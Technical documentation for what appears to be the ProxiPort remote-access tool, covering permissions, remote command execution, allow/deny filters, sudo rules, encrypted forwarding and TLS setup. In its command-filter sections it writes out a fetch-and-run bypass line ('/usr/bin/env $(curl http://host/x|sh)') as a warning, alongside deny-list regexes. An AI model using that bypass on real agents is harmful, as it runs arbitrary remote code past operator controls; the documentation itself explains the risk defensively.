Upgrading from 0.9.x or earlier: before 0.10.0, scheduler alone was enough to create and run a schedule of either type, which made it a superset of commands and scripts. If you have a group that grants scheduler without them, its members' schedules stop running once you upgrade to 0.10.0 or later. Add the permission the schedule's type needs, or delete the schedule. Administrators is unaffected, and so is any deployment whose auth backend has no group permissions at all (auth, auth_file): there is nothing there to check.

docs.title: Managing user groups
docs.text:
Permissions are stored in the database table named by [api] auth_group_details_table (group_details in the example config). Neither the JSON user file (auth_file) nor the single-user auth mode can hold them: those stores grant every user every permission, and reading, updating or deleting a single user group returns 400 there (see API authentication). On the database store, the PUT /api/v1/user-groups/<name> endpoint takes a permission map:

curl -s -X PUT \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  --data-raw '{
    "name": "ops-readonly",
    "permissions": {
      "tunnels": false,
      "scripts": false,
      "commands": false,
      "vault": false,
      "scheduler": false,
      "monitoring": true,
      "uploads": false,
      "auditlog": true
    }
  }' \
  https://proxiport.example.com/api/v1/user-groups/ops-readonly

On the database store the same matrix is editable on the User Groups page in the SPA.

docs.title: Client permissions
docs.text:
A function permission grants the user the ability to call an endpoint — but the endpoint also needs at least one agent the user is allowed to address.

Two ways to grant per-agent access:

docs.title: Per-client ACL
docs.text:
The client record carries an ACL: the allowed_user_groups field on the client response (request it with fields[clients]=allowed_user_groups if you limit the fields). An Administrators member sets it with POST /api/v1/clients/<id>/acl and a body of {"allowed_user_groups": ["ops-readonly", "customer-a"]}. Every name must be an existing user group, or the request is rejected; a successful call returns 204 No Content. Members of the listed groups can target that specific agent.

Useful when one server hosts several customers, and access boundaries match the tenant rather than any organisational category.

docs.title: Client-group permissions
docs.text:
Each client group carries an allowed_user_groups array of user-group names; members of those groups have access to every agent matching the group's params. Set it in the same POST/PUT body as params. PUT replaces the whole document, so include allowed_user_groups on every update, or it is cleared. Grant once, extend automatically as new agents match the group's params. This is the right shape for fleet-style operation.

Like function permissions, client permissions are additive only. Granting access to client group A cannot revoke access to client group B; if B is a subset of A, the user has access to B by virtue of having access to A.

docs.title: Putting it together: a worked example
docs.text:
You operate two product lines, apollo and bravo, with separate on-call teams. Both teams need to run scripts on their own hosts and read monitoring data. The platform team needs full access.

  1. Tag the agents. Each agent's proxiport.conf gets a tags entry under [client] (or use the attributes file if you'd rather manage tags from the API). For example, tags = ["apollo", "linux"].

  2. Define two client groups.

{ "id": "apollo-fleet", "params": { "tag": ["apollo"] } }
{ "id": "bravo-fleet",  "params": { "tag": ["bravo"]  } }
  1. Define two user groups.
{
  "name": "apollo-oncall",
  "permissions": {
    "scripts": true, "commands": true,
    "monitoring": true, "auditlog": true
  }
}
{
  "name": "bravo-oncall",
  "permissions": {
    "scripts": true, "commands": true,
    "monitoring": true, "auditlog": true
  }
}
  1. Grant client-group access. On apollo-fleet, allow user group apollo-oncall. On bravo-fleet, allow user group bravo-oncall. This is the allowed_user_groups field of each client group (you can also set it when you create the group in step 2):
{ "id": "apollo-fleet", "params": { "tag": ["apollo"] }, "allowed_user_groups": ["apollo-oncall"] }
{ "id": "bravo-fleet",  "params": { "tag": ["bravo"]  }, "allowed_user_groups": ["bravo-oncall"] }
  1. Add the operators. Apollo on-call humans go into the apollo-oncall user group. Bravo on-call humans into bravo-oncall. Platform engineers go into Administrators and bypass the whole model.

Adding a new apollo host needs only step 1 — the tag binding causes it to roll up into apollo-fleet, which the on-call group already has access to. No per-host ACL maintenance.

See also: client attributes for the more expressive 2-dimensional labelling model and operator runbook — user and group admin for the SPA workflow.

docs.title: Command execution
docs.text:
ProxiPort can dispatch a command to one or many connected agents, stream the output back, and record the result. The command travels through the existing chisel control channel — no tunnel is opened, and no extra port on the agent host is exposed.

For multi-line bodies and stored, reusable invocations, use scripts instead. Note that the agent's allow/deny filter applies to commands only — a script job runs the operator-chosen interpreter without consulting it. See Authorising commands on the agent.

docs.title: How it works
docs.text:
1. The operator (SPA, REST API, or a custom client) POSTs a command body to /api/v1/clients/<id>/commands (single host) or /api/v1/commands (multi-host).
  2. The server checks the user's commands permission and the per-client ACL, then forwards the body to the agent.
  3. The agent matches the command against its [remote-commands] allow/deny lists and, if accepted, spawns the process under the agent's own OS account (proxiport-agent on a packaged or pairing install, unless the installer was given a different account; this is not the server's proxiport account).
  4. The agent sends stdout/stderr and the final result back over the chisel channel, and the server stores the result in jobs.db. If the job was started over the /api/v1/ws/commands (or /api/v1/ws/scripts) WebSocket, the server also sends output chunks and the final result down that same socket. Other sockets cannot subscribe to the job. A job started over REST is not pushed anywhere: fetch its result from the job endpoint instead.

The job record keeps the status (successful, failed, or unknown if the timeout passed before the process ended), started_at / finished_at, the pid, created_by (the API user who submitted the job), error, and result.stdout / result.stderr. There is no separate exit-code field: a non-zero exit appears in error as text, for example exit status 1. The record does not store the OS account the process ran as.

docs.title: Single-host execution
docs.text:
CLIENT=alpha-prod
TOKEN=$(curl -s -u admin:password \
  https://proxiport.example.com/api/v1/login | jq -r .data.token)

JOB=$(curl -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  --data-raw '{"command":"/usr/bin/uname -a","timeout_sec":10}' \
  "https://proxiport.example.com/api/v1/clients/$CLIENT/commands" \
  | jq -r .data.jid)

# Fetch the result once it completes
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://proxiport.example.com/api/v1/clients/$CLIENT/commands/$JOB" | jq

A representative response:

{
  "data": {
    "jid": "f72b69fd-f418-40c3-ab62-4ce2c2022c58",
    "status": "successful",
    "client_id": "alpha-prod",
    "client_name": "alpha",
    "command": "/usr/bin/uname -a",
    "cwd": "",
    "is_sudo": false,
    "interpreter": "",
    "pid": 908526,
    "started_at": "2026-05-17T15:30:12.934Z",
    "finished_at": "2026-05-17T15:30:12.937Z",
    "created_by": "admin",
    "timeout_sec": 10,
    "multi_job_id": null,
    "schedule_id": null,
    "error": "",
    "is_script": false,
    "stream_result": false,
    "result": {
      "stdout": "Linux alpha 6.8.0-111-generic ...\n",
      "stderr": "",
      "summary": ""
    }
  }
}

cwd and interpreter echo the request values. When they are omitted they come back empty, and the agent uses its default shell and its own working directory.

timeout_sec is the agent's supervision window. If the process exceeds it, the job is marked unknown but the process is not killed — that is intentional, because killing a long-running migration mid-step is usually worse than letting it finish unsupervised.

docs.title: Job body fields
docs.text: Field Type Notes command string (required) The command line to execute. Must satisfy the agent's allow/deny filter. timeout_sec int Agent supervision timeout in seconds. If omitted or <= 0, the server's [server] run_remote_cmd_timeout_sec is used (60 unless changed). cwd string Working directory on the agent. is_sudo bool Run through sudo -n on Unix. Requires a NOPASSWD sudoers entry — see below. interpreter string Optional. For command jobs only cmd or powershell is accepted (Windows agents); leave it empty to use the agent's default shell. Any other value, including an [interpreter-aliases] name or a path such as /bin/bash, is rejected with HTTP 400 "Invalid interpreter." To use another interpreter or an alias, send a script job (see scripts).

docs.title: Multi-host execution
docs.text:
POST /api/v1/commands fans out a single command body to any combination of client IDs and client-group IDs:

curl -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  --data-raw '{
    "command": "/usr/bin/uptime",
    "client_ids": ["alpha-prod", "bravo-staging"],
    "group_ids": ["edge-fleet"],
    "execute_concurrently": true,
    "abort_on_error": false,
    "timeout_sec": 30
  }' \
  https://proxiport.example.com/api/v1/commands

The response carries only the parent job ID: {"data":{"jid":"..."}}. Poll GET /api/v1/commands/<jid> for the rolled-up status. Its jobs array holds one child job per target host. You can also list the child jobs with GET /api/v1/commands/<jid>/jobs.

To get live stdout, start the command over the WebSocket endpoint /api/v1/ws/commands instead: send the same JSON body as the first message on the socket, and output and results stream back as each host produces them. A job started with the REST POST cannot be attached to over WebSocket afterwards.

Execution-flow flags:

execute_concurrently : false by default — agents run in series, useful for migrations where one host must finish before the next starts. true fans the command out in parallel.

abort_on_error : true by default in sequential mode — the first failure stops the rest. Ignored in concurrent mode. Set to false to keep going regardless.

For group IDs, define the group first via the client-groups API.

docs.title: Authorising commands on the agent
docs.text:
Allowing arbitrary command execution from the API is not the default. Each agent's proxiport.conf has a [remote-commands] block with an allow/deny filter:

[remote-commands]
  enabled = true
  allow = [
    '^/usr/bin/.*',
    '^/usr/local/bin/.*',
    '^C:\\Windows\\System32\\.*'
  ]
  deny = ['(\||<|>|;|,|\n|&|\$|`|\(|\)|\{|\})']
  order = ['allow', 'deny']
  send_back_limit = 4194304

The filter is applied to the full command line as sent. Two practical consequences:

  • The operator must invoke commands by absolute path. uname -a is not in /usr/bin/.* unless sent as /usr/bin/uname -a.
  • Shell metacharacters are rejected by the default deny regex — pipes, redirects, ;, &&, and also $, backtick, parentheses and braces. The command is written to a script file and run through the shell, so command substitution ($(...), backticks) is a way out of the allow list by itself: /usr/bin/env $(curl http://host/x|sh) matches ^/usr/bin/.* and executes something else entirely. Wrap multi-step work in a script instead.

The filter is defence in depth, not a boundary

allow/deny are regular expressions applied to a string that is then handed to a shell. Treat them as a way to keep honest operators inside the intended set, not as a control that contains a determined one. If an operator should not be able to run arbitrary code on a host, do not give them the commands permission and leave [remote-commands] enabled = false on that agent. Note also that the filter applies only to the command path: a script job runs an operator-chosen interpreter and skips the allow/deny check entirely, which is what [remote-scripts] enabled gates.

docs.title: Upgrading — the default deny changed in 0.9.0
docs.text:
$, backtick, (, ), { and } were added to the shipped default. This only affects agents that never set deny themselves — an explicit deny in proxiport.conf is used as written and is not touched by an upgrade.

If you relied on the old default, commands that used a shell variable or parentheses will now be rejected on that agent, for example:

/usr/bin/df -h $HOME
/usr/bin/systemctl show proxiport --property=(MainPID)

You have three options, in the order they are worth considering:

  1. Send an absolute, literal command. $HOME expanded on the agent was never predictable from the operator's side anyway — /usr/bin/df -h /home/someone says what it means.
  2. Move the work into a script. Scripts are the supported way to run anything with shell structure in it; the allow/deny filter does not apply to them, and [remote-scripts] enabled is the switch that governs them.

  3. Set deny explicitly to the old value if you have decided the risk is acceptable on that host:

    [remote-commands]
  deny = ['(\||<|>|;|,|\n|&)']

    Do this knowing what it allows: with the default allow of ^/usr/bin/.*, /usr/bin/env $(curl http://host/x|sh) passes the filter and runs whatever the substitution fetches.

docs.title: Order semantics
docs.text:
order = ['allow', 'deny'] (the default):

  1. The command must match at least one allow regex.
  2. If it also matches a deny regex, it is rejected.
  3. Otherwise it is allowed.

order = ['deny', 'allow']:

  1. If the command matches a deny regex, it is rejected unless it also matches an allow regex.
  2. Anything that matches no regex at all is allowed.

The first order is "default deny", the second is "default allow". Use the first one unless you have a specific reason.

docs.title: Examples
docs.text:
Allow anything under the standard binary dirs, plus command text that itself starts with sudo -n:

allow = [
  '^/usr/bin/.*',
  '^/usr/local/bin/.*',
  '^sudo -n .*'
]

The filter checks the command text exactly as sent. With is_sudo: true the agent adds sudo -n only after the filter has passed, so is_sudo does not change what the filter sees, and you do not need the ^sudo -n .* entry for is_sudo commands: /usr/bin/systemctl restart nginx sent with is_sudo: true is allowed by ^/usr/bin/.*. The ^sudo -n .* entry only matters for commands whose text literally starts with sudo -n, and it allows any path after that prefix, so only your sudoers rules limit what such a command can run.

Allow a single specific script:

allow = ['^/opt/site/maintenance.sh( |$)']

Allow batch files under a fixed directory on Windows:

allow = [
  '^C:\\Windows\\System32\\.*',
  '^C:\\Users\\Administrator\\scripts\\.*\\.bat'
]

This filters the command line of command jobs only. Jobs sent as scripts skip allow/deny and are controlled by [remote-scripts].

docs.title: Sudo / privileged commands
docs.text:
The agent runs as an unprivileged user on Linux. On Windows, both the --service install registration and the MSI install the service under LocalSystem by default. That account is fully privileged, so every command and script already runs with SYSTEM rights, and is_sudo has no effect. On Windows the allow/deny filter is the only control on commands, and it does not apply to scripts at all.

On Linux, is_sudo: true does not run your command text directly. The agent writes the command to a temporary file under <data_dir>/scripts/ and runs sudo -n <interpreter> <data_dir>/scripts/<random-uuid>. The interpreter is the default shell (/bin/sh). If the command starts with a shebang line, the agent runs sudo -n <data_dir>/scripts/<random-uuid> instead. sudo sees only the interpreter and the file path, never the command inside it, so a sudoers rule cannot limit is_sudo to particular commands. Any rule that lets it work, such as

proxiport-agent ALL=(ALL) NOPASSWD: /bin/sh /var/lib/proxiport-agent/scripts/*

lets the agent run any command as root.

To give root to particular commands only, leave is_sudo off. Send the command as sudo -n /absolute/path args, allow exactly that text in [remote-commands] allow, and add a NOPASSWD sudoers rule scoped to the same command:

[remote-commands]
  allow = [
    '^/usr/bin/.*',
    '^sudo -n /usr/bin/systemctl restart nginx$'
  ]

# /etc/sudoers.d/proxiport-agent
proxiport-agent ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart nginx

Avoid a blanket proxiport-agent ALL=(ALL) NOPASSWD: ALL — at that point the allow/deny filter is the only thing standing between the API and full root, and that filter does not apply to scripts at all.

Note that the Linux pairing installer's -s option (the Give remote scripts and commands sudo rights checkbox in the pairing dialog) creates exactly this blanket rule. It writes proxiport-agent ALL=(ALL) NOPASSWD:ALL to /etc/sudoers.d/proxiport-all-cmd (it leaves an existing file of that name alone). If you enabled it, replace that file with a rule scoped to the commands you need, as shown above, or delete it.

The agent's account changed in 0.10.0

The agent used to run as proxiport, which is now the server's account alone. A sudoers rule naming proxiport no longer applies to the agent — privileged commands will fail — and it grants those rights to the ProxiPort server instead, which is not what it was written for. The package upgrade prints a warning when it finds one. Rename the user in the rule, or remove it.

docs.title: Output size limits
docs.text: The default send_back_limit is 4 MiB per stream. Output beyond the limit is dropped. The job still reports what was captured, and its error field says which stream overflowed, for example overflow of stdOut buffer: maximum send_back_limit of 4194304 bytes exceeded (stderr overflow is reported the same way as overflow of stdErr buffer: ...). Raise the limit in [remote-commands] if you need full output, or write the output to a file on the agent and pull it back via a separate path.

docs.title: API surface
docs.text:
Endpoint Purpose POST /api/v1/clients/<id>/commands Run a command on one host GET /api/v1/clients/<id>/commands List that host's command jobs GET /api/v1/clients/<id>/commands/<jid> Single-host result POST /api/v1/commands Multi-host fan-out GET /api/v1/commands List multi-host jobs GET /api/v1/commands/<jid> Multi-host job summary GET /api/v1/commands/<jid>/jobs Per-host results of a multi-host job GET / POST /api/v1/library/commands List / create stored commands GET / PUT / DELETE /api/v1/library/commands/<id> Read / update / delete a stored command WS /api/v1/ws/commands Start a command on one or more clients over a WebSocket (send the request as the first message) and receive its output and results live

See also: scripts, client groups and permissions, operator runbook — commands and scripts.

docs.title: End-to-end encrypted forwarding
docs.text:
A normal tunnel encrypts only the hop between the server and the agent. Between your machine and the server, ProxiPort relays the raw bytes; the only extra layer there is the TLS the server terminates on a proxied (http_proxy) tunnel. So whatever your application protocol does not encrypt end to end, and everything that passes through a TLS-terminating proxied tunnel, can be read by whoever controls the server or the host it runs on. Protocols that are already encrypted end to end, such as SSH to the host's own sshd or HTTPS through a plain tunnel, reach the server only as ciphertext. e2e forwarding closes the gap for every protocol.

With [e2e] enabled, the agent runs a small SSH server on its own loopback interface. You open an ordinary tunnel to it and run a standard SSH client through that tunnel. The SSH session is encrypted between your SSH client and the agent, so the ProxiPort server only relays ciphertext. You pin the agent's host key yourself, so the server can't substitute its own key without your SSH client refusing the connection.

The agent's SSH server only does port forwarding (ssh -L). It refuses shells, remote commands and reverse forwards.

docs.title: What it protects, and what it doesn't
docs.text:
The session protects the traffic between your SSH client and the agent. The agent makes the last hop to the target itself, on its own host or LAN, the same way it does for a normal tunnel.

The server can still see:

  • that a session exists, when it starts and ends, and how much data flows;
  • your IP address and the agent's;
  • the tunnel it relays, which points at the agent's loopback SSH port.

It cannot see the targets you forward to or the data you send.

Disable the features that let the server act on the host

[remote-commands], [remote-scripts] and [file-reception] let the server run programs or write files on the agent's host. A server that wants to can use them to copy the agent's host key or add its own key to the authorized keys file, and then read e2e sessions too. The agent prints a warning to standard error at startup when [e2e] is enabled together with any of them. Under systemd this shows up in the service's journal, not in the [logging] log_file. To rely on e2e against the server itself, disable all three. [remote-commands] and [file-reception] are enabled by default.

docs.title: 1. Authorize your SSH key on the agent
docs.text:
Put the public keys allowed to connect in a file on the agent's host, in the usual authorized_keys format:

sudo install -m 0644 -o root -g root /dev/null /etc/proxiport/e2e_authorized_keys
echo "ssh-ed25519 AAAA... alice@laptop" | sudo tee -a /etc/proxiport/e2e_authorized_keys

The agent reads this file on every login attempt, so adding or removing a key takes effect without a restart. Keep it writable only by root: a file the agent's own user can write is a file anything running as that user can add a key to.

docs.title: 2. Enable [e2e] in the agent config
docs.text:
[e2e]
  enabled = true
  authorized_keys_file = "/etc/proxiport/e2e_authorized_keys"
  ## Loopback address to listen on. Must be a loopback IP.
  # listen = "127.0.0.1:7222"
  ## Created on first start if missing. Defaults to
  ## <data_dir>/e2e_host_ed25519_key.
  # host_key_file = "/var/lib/proxiport-agent/e2e_host_ed25519_key"

[remote-commands]
  enabled = false

[file-reception]
  enabled = false

Restart the agent. On its first start it generates an ed25519 host key and logs:

info: client: e2e: listening on 127.0.0.1:7222, host key SHA256:...

If the agent's [client] tunnel_allowed list is set, add the listen address to it, or the tunnel in step 4 is refused.

docs.title: 3. Get the host key over a channel you trust
docs.text:
On the agent's host, print the key:

sudo proxiport -c /etc/proxiport/proxiport.conf --e2e-fingerprint

SHA256:<fingerprint>
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA<rest of the key>

Copy the key to your machine through a channel that does not go through the ProxiPort server: your own SSH or console access to the host, your configuration management, or reading it off the screen. Do not fetch it through ProxiPort, for example with a remote command: the server could hand you its own key instead, and the pin would protect nothing.

Add it to a known-hosts file under a name of your choosing:

echo "web01-e2e ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA<rest of the key>" >> ~/.ssh/known_hosts

docs.title: 4. Open a tunnel to the agent's SSH port
docs.text:
Create a tunnel to 127.0.0.1:7222 on the agent, in the web UI or through the API. Restrict it to your own address with acl:

curl -X PUT -H "Authorization: Bearer $TOKEN" \
  "https://proxiport.example.com/api/v1/clients/<id>/tunnels?remote=127.0.0.1:7222&acl=203.0.113.7"

The response includes the server port the tunnel listens on (lport).

docs.title: 5. Forward through it
docs.text:
ssh -N -p <lport> \
  -o HostKeyAlias=web01-e2e -o StrictHostKeyChecking=yes \
  -L 8080:10.0.0.5:80 \
  e2e@proxiport.example.com

HostKeyAlias makes SSH check the key you pinned in step 3 instead of a key for the server's name. With StrictHostKeyChecking=yes, any other key stops the connection with REMOTE HOST IDENTIFICATION HAS CHANGED. The user name is not checked; only the key is.

http://localhost:8080 now reaches 10.0.0.5:80 from the agent's side, and the ProxiPort server relays only the SSH session. Forwards are subject to the agent's tunnel_allowed list, like normal tunnels.

docs.title: Cryptography
docs.text: The session is SSH. With a current OpenSSH client it negotiates the hybrid post-quantum key exchange mlkem768x25519-sha256. Run ssh -v and look for the kex: algorithm: line to confirm.

docs.title: Rotating keys
docs.text:
• Operator keys: edit the authorized keys file. Changes apply to the next login.
  • Host key: stop the agent, delete the host key file, and start it again. It generates a new key, which you pin again as in step 3.

docs.title: Securing proxiportd with HTTPS
docs.text:
proxiportd terminates TLS itself on the API/SPA listener. The agent (chisel) listener speaks plain WebSocket: the SSH session inside it carries its own encryption and the agent checks the server's host key against its configured fingerprint, so TLS on that port is a reverse proxy's job, not the server's. Three deployment shapes are supported for the API:

  1. Built-in ACME — ProxiPort obtains and renews a Let's Encrypt certificate itself. One config line on a single-purpose host; no external tooling.
  2. Manually-managed certificates — supply your own cert_file/key_file and renew them on your own schedule (or wire certbot to do it).
  3. External reverse proxy in front — nginx, Caddy, or Traefik handles TLS; ProxiPort listens on plain HTTP/WebSocket bound to localhost. Useful when you already run a TLS edge for other services on the same host.

Never run the API on plain HTTP across the network

Credentials, JWTs, command output, and file pushes all cross the API channel in clear. Even on a trusted intranet, terminate TLS somewhere. The only safe plain-HTTP binding is 127.0.0.1 with a TLS proxy on the public side.

docs.title: Choosing between the three
docs.text: Setup When it fits Built-in ACME Single-purpose host, no other web service on the box, the API on port 443 and reachable from the internet (Let's Encrypt validates with TLS-ALPN-01 on that listener). Easiest production setup. Manual cert files Behind an internal CA, an air-gapped environment, or any setup where certbot cannot reach Let's Encrypt directly. External reverse proxy You already run nginx/Caddy; you want one TLS surface across many services; you want HTTP/2 / HTTP/3, request logging, rate limiting, or path routing in one place.

docs.title: External reverse proxy in front
docs.text:
Bind ProxiPort to localhost and let the proxy handle TLS. Two pieces need to be reachable through the proxy:

  • the API/SPA listener ([api] address), serving HTTP+WS, and
  • the agent (chisel) listener ([server] address), serving the WebSocket upgrade that carries the SSH-over-WS tunnel transport.

The two listeners are separate servers: agents connect only to the [server] address listener, and the API/SPA is served only on [api] address. The proxy has to route each to its own backend. The simplest way is two hostnames:

proxiport.example.com {
    reverse_proxy 127.0.0.1:3000   # API + SPA
}

agents.proxiport.example.com {
    reverse_proxy 127.0.0.1:80     # agent (chisel) WebSocket
}

Caddy proxies WebSocket upgrades by default, so neither block needs extra directives — neither for the agent transport on the second block nor for the SPA's /api/v1/ws/* command, script and upload streams on the first.

The matching proxiportd.conf:

[server]
  address = "127.0.0.1:80"
  url     = "https://agents.proxiport.example.com"

[api]
  address = "127.0.0.1:3000"
  # leave cert_file and key_file commented out

To serve agents and the UI on one hostname instead, send the whole site to the agent listener (reverse_proxy 127.0.0.1:80) and set proxy = "http://127.0.0.1:3000" under [server]. The agent listener answers agent upgrades itself and forwards every other request, including the SPA's WebSocket streams, to the API. Every request on that listener, proxied ones included, is limited to [server] max_request_bytes_client (512 KB by default), so raise it if you upload larger files through the web UI in this setup.

Agents then dial the proxy, not the loopback listener, and must give the scheme explicitly: [client] server = "https://agents.proxiport.example.com" (the port defaults to 443). A value without a scheme, like the host:80 form in the example agent config, is treated as plain ws://, so the agent never completes the handshake with the TLS port. [server] url is the connect address the server advertises; setting it to the proxied address means agent configs generated through pairing point at the proxy as well.

For nginx, the key directives are proxy_set_header Upgrade, proxy_set_header Connection "upgrade", and a long proxy_read_timeout on the WebSocket location.

Behind a proxy, also set [api] trusted_proxies to the address the proxy connects from and configure the proxy to forward X-Forwarded-For. Both halves are needed: the server ignores the header from any peer not on that list, and the list is empty by default — so without it the audit log records 127.0.0.1 for every operator action and the Only my current IP address tunnel ACL preset writes an ACL for the loopback. See IP-address determination.

docs.title: Built-in ACME
docs.text:
ProxiPort embeds an automatic certificate manager. It will request, install, and renew a Let's Encrypt certificate without any external tooling.

Enable it in proxiportd.conf under [api]:

[api]
  address = "0.0.0.0:443"
  base_url = "https://proxiport.example.com:443"
  enable_acme = true

base_url is mandatory — its hostname must resolve in public DNS to the address the ACME challenge will reach. The certificate is issued for that hostname.

Validation uses TLS-ALPN-01 on port 443 by default

With [api] address on port 443, Let's Encrypt validates over TLS-ALPN-01 on the API listener itself, and nothing else needs to be open. If the API cannot be reached on 443 from the internet, enable the HTTP-01 fallback with [server] acme_http_port = 80, which starts a separate plain-HTTP challenge listener. Let's Encrypt only connects to ports 443 (TLS-ALPN-01) and 80 (HTTP-01) — that's a Let's Encrypt protocol restriction, not a ProxiPort one. The packaged config puts the agent listener on port 80 ([server] address = "0.0.0.0:80"), so move the agent listener to another port first; otherwise the challenge listener cannot bind and issuance fails.

Certificates are stored in {data_dir}/acme/, which defaults to /var/lib/proxiport/acme/.

The built-in ACME client can also issue a certificate for the built-in tunnel proxy. Set the proxy's hostname and turn ACME on for it:

[server]
  tunnel_host = "tunnels.proxiport.example.com"
  tunnel_enable_acme = true

This gets a certificate for that one hostname only. The built-in client validates over TLS-ALPN-01 or HTTP-01, so it cannot issue the wildcard certificate that the Caddy-integrated tunnel subdomains need. Get that wildcard with a DNS-01 client such as certbot, then point [caddy-integration] cert_file / key_file at it.

If a certificate is not issued, check the server's standard error (under systemd, journalctl -u proxiportd). Certificate errors appear there as http: TLS handshake error from …: acme/autocert: … lines, whatever log_level is set to. Also confirm that the base_url hostname (and tunnel_host, if used) resolves in public DNS to this server and that port 443 is reachable from the internet (or port 80, when acme_http_port is set).

docs.title: Manual cert files
docs.text:
If you cannot use built-in ACME, point ProxiPort at a key and certificate on disk. Both files must be readable by the proxiport system user and the key must not be passphrase-protected:

[api]
  address   = "0.0.0.0:443"
  base_url  = "https://proxiport.example.com"
  cert_file = "/etc/proxiport/tls/fullchain.pem"
  key_file  = "/etc/proxiport/tls/privkey.pem"

Restart proxiportd after writing the config. Verify with:

curl -sv -u admin:password -o /dev/null https://proxiport.example.com/api/v1/status

The verbose output shows the certificate the server presented (subject, issuer, expiry) followed by HTTP/1.1 200 (or HTTP/2 200). Don't use curl -I: it sends HEAD, which the API does not serve, so you get an error status even when TLS is set up correctly.

docs.title: Using certbot
docs.text:
certbot works fine standalone. The trick is permissions: by default the renewed files live under /etc/letsencrypt/archive/ with mode 700 root:root, which the unprivileged proxiport user cannot read.

DOMAIN=proxiport.example.com
sudo apt install certbot
sudo certbot certonly --standalone -d "$DOMAIN" -n --agree-tos -m ops@example.com

# Make the Let's Encrypt tree readable by the proxiport user
sudo chgrp -R proxiport /etc/letsencrypt/{archive,live}
sudo find /etc/letsencrypt/{archive,live} -type d -exec chmod g+rx {} \;
sudo find /etc/letsencrypt/{archive,live} -type f -exec chmod g+r {} \;

Then point cert_file and key_file at the /etc/letsencrypt/live/<DOMAIN>/ symlinks — they always resolve to the current cert:

[api]
  cert_file = "/etc/letsencrypt/live/proxiport.example.com/fullchain.pem"
  key_file  = "/etc/letsencrypt/live/proxiport.example.com/privkey.pem"

docs.title: Auto-renewal
docs.text:
certbot ships a systemd timer (/lib/systemd/system/certbot.timer) that runs certbot -q renew twice a day. The renewed files keep the same paths, but proxiportd does not pick them up automatically — the certificate is read once at start. Wire a deploy-hook to restart the service after a successful renewal:

sudo mkdir -p /etc/letsencrypt/renewal-hooks/deploy
sudo tee /etc/letsencrypt/renewal-hooks/deploy/restart-proxiportd.sh <<'EOF'
#!/bin/sh
systemctl restart proxiportd
EOF
sudo chmod +x /etc/letsencrypt/renewal-hooks/deploy/restart-proxiportd.sh

If you front ProxiPort with a reverse proxy, the proxy reloads its own certificate — ProxiPort does not need to know about the renewal.

docs.title: TLS minimum version
docs.text:
[api] accepts a tls_min setting. The default is TLS 1.3. To accept TLS 1.2 for legacy clients:

[api]
  tls_min = "1.2"

Anything older than 1.2 is hard-rejected. ProxiPort does not implement SSLv3 / TLS 1.0 / TLS 1.1 fallbacks and will not.

docs.title: Verifying the setup
docs.text:
# Cert chain and expiry
echo | openssl s_client -connect proxiport.example.com:443 -servername proxiport.example.com 2>/dev/null \
  | openssl x509 -noout -subject -issuer -dates

# API reachability
curl -sf -u admin:password https://proxiport.example.com/api/v1/status | jq

# Agent connection from a managed host
sudo systemctl restart proxiport
sudo tail -n 50 /var/log/proxiport-agent/proxiport.log

The agent writes its log to the file set by [logging] log_file in /etc/proxiport/proxiport.conf. Packaged and paired installs use /var/log/proxiport-agent/proxiport.log, or /var/log/<account>/proxiport.log when the pairing installer ran the agent under another account. journalctl -u proxiport shows the agent's own output only when log_file is unset. A healthy agent log shows Connected to <server> within <time> a few seconds after start; the host-key check happens before that line.

See also: install, operator runbook, tunnel hosting for the related Caddy + wildcard certificate setup.

docs.title: Install
docs.text:
Just want to see it work?

The public demo at https://demo.proxiport.net/ lets you sign in (demo / demo) and explore an Inventory of three pre-registered agents without installing anything. State resets every hour.

ProxiPort has two pieces: the server (proxiportd) and the agent (proxiport). One server reaches many agents; the agent dials the server over an outbound WebSocket, so it works behind NAT without inbound firewall rules.

This page covers a single-server install on Linux and a single Linux agent. For Windows and macOS agents, see Manual install — Windows and macOS.

docs.title: Requirements
docs.text:
• Linux x86_64 or arm64 with systemd.
  • A public hostname pointed at the host. The Pick a public listener step below walks through the three TLS setups (built-in ACME, manual cert, reverse proxy) — all of them need a hostname.
  • Ports 80 and 443 reachable from the network you want agents to connect from (80 for the agent listener, 443 for the TLS API). Built-in ACME validates over TLS-ALPN-01 on the API's port 443, so with that setup 443 must be reachable from the internet.
  • SQLite is the default datastore; MySQL is also supported.

docs.title: Install
docs.text:
Each release on the GitHub releases page ships the server for linux/amd64 and linux/arm64 in three formats:

  • Debian/Ubuntu .deb — proxiportd_<ver>_linux_<arch>.deb
  • Fedora/RHEL/openSUSE .rpm — proxiportd_<ver>_linux_<arch>.rpm
  • Tarball — proxiportd_<ver>_linux_<arch>.tar.gz, for other distributions

Asset filenames carry the version; the snippets below resolve the latest tag from the GitHub API before downloading. Substitute arm64 for x86_64 on aarch64 hosts.

docs.title: Debian / Ubuntu
docs.text:
VER=$(curl -fsSL https://api.github.com/repos/proximile/proxiport/releases/latest \
        | sed -n 's/.*"tag_name": *"\([^"]*\)".*/\1/p')
curl -LO "https://github.com/proximile/proxiport/releases/download/${VER}/proxiportd_${VER#v}_linux_x86_64.deb"
sudo dpkg -i "proxiportd_${VER#v}_linux_x86_64.deb"

docs.title: Fedora / RHEL / openSUSE
docs.text:
VER=$(curl -fsSL https://api.github.com/repos/proximile/proxiport/releases/latest \
        | sed -n 's/.*"tag_name": *"\([^"]*\)".*/\1/p')
sudo rpm -ivh "https://github.com/proximile/proxiport/releases/download/${VER}/proxiportd_${VER#v}_linux_x86_64.rpm"

docs.title: Tarball (other distributions)
docs.text:
VER=$(curl -fsSL https://api.github.com/repos/proximile/proxiport/releases/latest \
        | sed -n 's/.*"tag_name": *"\([^"]*\)".*/\1/p')
curl -LO "https://github.com/proximile/proxiport/releases/download/${VER}/proxiportd_${VER#v}_linux_x86_64.tar.gz"
tar xzf "proxiportd_${VER#v}_linux_x86_64.tar.gz"

sudo install -m 0755 proxiportd /usr/bin/proxiportd
sudo install -d /etc/proxiport
sudo install -m 0640 proxiportd.example.conf /etc/proxiport/proxiportd.conf
sudo install -m 0644 proxiportd.service /lib/systemd/system/proxiportd.service
# The web UI, root-owned where only root can write.
sudo install -d -o root -g root -m 0755 /usr/share/proxiport
sudo cp -r docroot /usr/share/proxiport/docroot
